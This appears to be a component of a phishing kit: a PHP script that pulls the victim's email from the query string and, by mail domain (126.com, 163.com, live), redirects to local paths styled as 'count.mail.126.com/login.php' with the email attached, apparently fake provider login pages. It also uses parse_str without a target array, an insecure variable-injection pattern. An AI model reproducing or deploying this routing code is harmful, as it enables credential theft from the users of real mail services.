<?php 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $email);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@126.') !== false || stripos($domain_check, '@126.') !== false || stripos($domain_check, '@126.') !== false){
		header('Location: count.mail.126.com/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
	}
	elseif(stripos($domain_check, '@live.')!== false || stripos($domain_check, '@163.') !== false || stripos($domain_check, '@163.') !== false || stripos($domain_check, '@163.') !== false) {
		header('Location: count.mail.163.com/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
			}
	
?>
